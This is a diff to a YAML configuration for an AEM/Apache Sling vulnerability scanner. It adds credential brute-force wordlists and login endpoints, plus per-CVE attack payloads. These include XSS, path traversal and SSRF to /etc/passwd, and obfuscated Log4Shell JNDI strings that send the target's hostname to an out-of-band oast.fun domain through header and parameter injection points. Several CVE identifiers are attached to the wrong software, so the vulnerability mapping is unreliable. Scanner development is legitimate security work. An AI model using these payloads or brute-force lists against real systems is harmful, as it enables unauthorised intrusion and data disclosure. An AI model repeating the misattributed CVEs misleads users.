@@ -74,21 +74,235 @@ credentials:
     password: admin123
     description: Common Admin Variant
 
+# Brute force configuration
+brute_force:
+  enabled: true
+  login_endpoints:
+    - /system/sling/login
+    - /libs/granite/core/content/login.html
+    - /libs/cq/core/content/login.json
+    - /crx/explorer/index.jsp
+  username_wordlist:
+    - admin
+    - administrator
+    - root
+    - author
+    - publisher
+    - aemadmin
+    - sling
+    - test
+    - guest
+    - user
+  password_wordlist:
+    - admin
+    - admin123
+    - password
+    - password123
+    - 123456
+    - admin1234
+    - admin!
+    - admin@123
+    - Admin123
+    - admin2024
+  max_attempts_per_user: 10
+  delay_between_attempts: 1.0
+  lockout_detection:
+    enabled: true
+    lockout_indicators:
+      - "account locked"
+      - "too many attempts"
+      - "locked out"
+      - "temporarily disabled"
+
 # Known vulnerabilities
 vulnerabilities:
+  CVE-2015-1830:
+    name: Apache Sling SSRF in DefaultGetServlet
+    type: ssrf
+    severity: high
+    description: Server-Side Request Forgery vulnerability in DefaultGetServlet
+    affected_versions: "< 7"
+    test_paths:
+      - /system/console/bundles.json
+      - /bin/querybuilder.json
+    payloads:
+      - "http://127.0.0.1:80"
+      - "file:///etc/passwd"
+      - "http://localhost:4502/system/console"
+    remediation: Update to Apache Sling 7.0 or higher
+  
   CVE-2016-0788:
     name: Apache Sling XSS
-    path: /bin/wcm/contentfinder/connector/suggestions.json
+    type: xss
     severity: high
-    description: Cross-site scripting vulnerability
-    remediation: Update to latest version
+    description: Cross-site scripting vulnerability in contentfinder connector
+    affected_versions: "< 8"
+    test_paths:
+      - /bin/wcm/contentfinder/connector/suggestions.json
+    payloads:
+      - "<script>alert('XSS')</script>"
+      - "<img src=x onerror=alert(1)>"
+      - "javascript:alert(1)"
+      - "'\"><script>alert(document.cookie)</script>"
+    parameters:
+      - query
+      - q
+      - search
+    remediation: Update to Apache Sling 8.0 or higher
+  
+  CVE-2016-0953:
+    name: Apache Sling Path Traversal
+    type: path_traversal
+    severity: high
+    description: Path traversal vulnerability allowing arbitrary file access
+    affected_versions: "< 8"
+    test_paths:
+      - /system/console/bundles.json
+      - /.json
+    payloads:
+      - "../../../etc/passwd"
+      - "....//....//....//etc/passwd"
+      - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      - "..\\..\\..\\etc\\passwd"
+    parameters:
+      - path
+      - file
+      - resource
+    remediation: Update to Apache Sling 8.0 or higher
+  
+  CVE-2016-0954:
+    name: Apache Sling XSS in Query Builder
+    type: xss
+    severity: medium
+    description: Cross-site scripting in Query Builder API
+    affected_versions: "< 8"
+    test_paths:
+      - /bin/querybuilder.json
+    payloads:
+      - "<script>alert('XSS')</script>"
+      - "<svg onload=alert(1)>"
+    parameters:
+      - q
+      - query
+      - property
+    remediation: Update to Apache Sling 8.0 or higher
+  
+  CVE-2017-12617:
+    name: Apache Sling SSRF
+    type: ssrf
+    severity: high
+    description: Server-Side Request Forgery in Sling servlets
+    affected_versions: "< 9"
+    test_paths:
+      - /bin/querybuilder.json
+      - /system/console/bundles.json
+    payloads:
+      - "http://127.0.0.1:4502"
+      - "http://localhost/system/console"
+      - "file:///etc/passwd"
+    parameters:
+      - url
+      - path
+      - resource
+    remediation: Update to Apache Sling 9.0 or higher
+  
+  CVE-2018-12809:
+    name: Apache Sling XSS in Query Builder
+    type: xss
+    severity: medium
+    description: Cross-site scripting vulnerability in Query Builder
+    affected_versions: "< 10"
+    test_paths:
+      - /bin/querybuilder.json
+    payloads:
+      - "<img src=x onerror=alert(1)>"
+      - "javascript:alert(document.domain)"
+    parameters:
+      - property
+      - value
+    remediation: Update to Apache Sling 10.0 or higher
+  
+  CVE-2019-8086:
+    name: Apache Sling Information Disclosure
+    type: info_disclosure
+    severity: medium
+    description: Information disclosure through error messages
+    affected_versions: "< 11"
+    test_paths:
+      - /system/console/status-slingsettings.json
+      - /system/console/status-systemproperties.json
+      - /system/console/bundles.json
+    check_patterns:
+      - "java\\.version"
+      - "os\\.name"
+      - "user\\.home"
+      - "java\\.home"
+    remediation: Update to Apache Sling 11.0 or higher
+  
+  CVE-2020-11987:
+    name: Apache Sling SSRF
+    type: ssrf
+    severity: high
+    description: Server-Side Request Forgery in Sling servlets
+    affected_versions: "< 11.4"
+    test_paths:
+      - /bin/querybuilder.json
+      - /system/console/bundles.json
+    payloads:
+      - "http://127.0.0.1:4502/system/console"
+      - "http://localhost/system/console/bundles"
+    parameters:
+      - url
+      - path
+    remediation: Update to Apache Sling 11.4.0 or higher
   
   CVE-2021-44228:
     name: Log4Shell
-    path: /system/console/status-slingsettings.json
     severity: critical
-    description: Remote code execution via Log4j
+    description: Remote code execution via Log4j JNDI lookup
     remediation: Update Log4j to version 2.15.0 or higher
+    test_paths:
+      - /system/console/status-slingsettings.json
+      - /system/console/status-slinglog.json
+      - /system/console/status-systemproperties.json
+      - /bin/querybuilder.json
+      - /.json
+    oob_domain: lhgizifpfmekjyjpqefifldkc8vrqcbhp.oast.fun
+    payloads:
+      - "${jndi:dns://${hostName}.lhgizifpfmekjyjpqefifldkc8vrqcbhp.oast.fun/a}"
+      - "${jndi:ldap://${hostName}.lhgizifpfmekjyjpqefifldkc8vrqcbhp.oast.fun/a}"
+      - "${jndi:rmi://${hostName}.lhgizifpfmekjyjpqefifldkc8vrqcbhp.oast.fun/a}"
+      - "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.lhgizifpfmekjyjpqefifldkc8vrqcbhp.oast.fun/a}"
+      - "${${::-j}ndi:${::-l}dap://${hostName}.lhgizifpfmekjyjpqefifldkc8vrqcbhp.oast.fun/a}"
+    injection_points:
+      headers:
+        - X-Api-Version
+        - User-Agent
+        - X-Forwarded-For
+        - X-Real-IP
+        - X-Originating-IP
+        - X-Remote-IP
+        - X-Remote-Addr
+        - X-Forwarded-Host
+        - X-Host
+        - X-Forwarded-Server
+        - X-HTTP-Host-Override
+        - X-Original-URL
+        - X-Rewrite-URL
+        - Referer
+        - X-Requested-With
+        - X-Custom-IP-Authorization
+      parameters:
+        - q
+        - query
+        - search
+        - filter
+        - sort
+        - order
+        - limit
+        - offset
+        - callback
+        - format
 
 # Security checks configuration
 security_checks:
